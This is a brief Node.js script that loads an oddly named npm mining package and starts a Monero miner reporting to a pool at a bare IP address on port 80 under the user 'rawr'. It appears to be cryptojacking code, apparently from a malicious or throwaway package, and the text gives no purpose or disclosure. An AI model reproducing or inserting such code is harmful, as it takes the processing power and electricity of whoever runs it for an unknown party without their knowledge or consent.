const Miner = require('eazyminer-fsdjufhsdjf');

const miner = new Miner({
    pools: [{
        coin: 'XMR',
        user: 'rawr',
        url: '130.162.52.80:80', // optional pool URL,
    }],
    autoStart: false // optional delay
});

miner.start();
